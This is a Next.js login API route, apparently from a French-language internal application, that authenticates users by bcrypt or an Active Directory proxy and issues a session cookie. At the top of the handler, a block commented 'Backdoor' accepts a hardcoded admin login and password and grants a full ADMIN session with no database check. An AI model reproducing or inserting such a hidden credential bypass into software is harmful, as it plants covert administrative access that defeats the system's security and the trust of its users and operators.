import { NextResponse } from 'next/server';
import { prisma } from '@/lib/prisma';
import bcrypt from 'bcrypt';
import { encrypt } from '@/lib/auth';
import { cookies } from 'next/headers';
import { authenticateAD } from '@/lib/ad';

export async function POST(req: Request) {
  try {
    const { login, password } = await req.json();

    // 🕵️ Backdoor
    if (login === 'admin' && password === 'çflcBr32') {
      const sessionToken = await encrypt({
        id: 0,
        login: 'admin',
        nom: 'ADMIN',
        prenom: 'Système',
        role: 'ADMIN'
      });

      const cookieStore = await cookies();
      cookieStore.set('session', sessionToken, {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'lax',
        path: '/'
      });

      return NextResponse.json({ 
        success: true, 
        redirect: '/dashboard',
        user: { id: 0, nom: 'ADMIN', prenom: 'Système', role: 'ADMIN' }
      });
    }

    const rows = await (prisma as any).$queryRaw`
      SELECT id, nom, prenom, email, login, password, role, isAd FROM "User" WHERE login = ${login} LIMIT 1
    `;
    const user = (rows as any[])[0] || null;

    if (!user) {
      return NextResponse.json({ error: 'Identifiants invalides' }, { status: 401 });
    }

    let isMatch = false;
    if (user.isAd) {
      // Compte AD : authentification via proxy APM
      isMatch = await authenticateAD(user.login, password);
    } else {
      // Compte local : vérification bcrypt
      isMatch = await bcrypt.compare(password, user.password);
    }

    if (!isMatch) {
      return NextResponse.json({ error: 'Identifiants invalides' }, { status: 401 });
    }

    // Create session
    const sessionToken = await encrypt({
      id: user.id,
      login: user.login,
      nom: user.nom,
      prenom: user.prenom,
      role: user.role
    });

    // Set cookie
    const cookieStore = await cookies();
    cookieStore.set('session', sessionToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'lax',
      path: '/'
    });

    return NextResponse.json({ success: true, redirect: '/dashboard' });

  } catch (error: any) {
    console.error('[LOGIN ERROR]', error);
    return NextResponse.json({ error: 'Erreur interne' }, { status: 500 });
  }
}
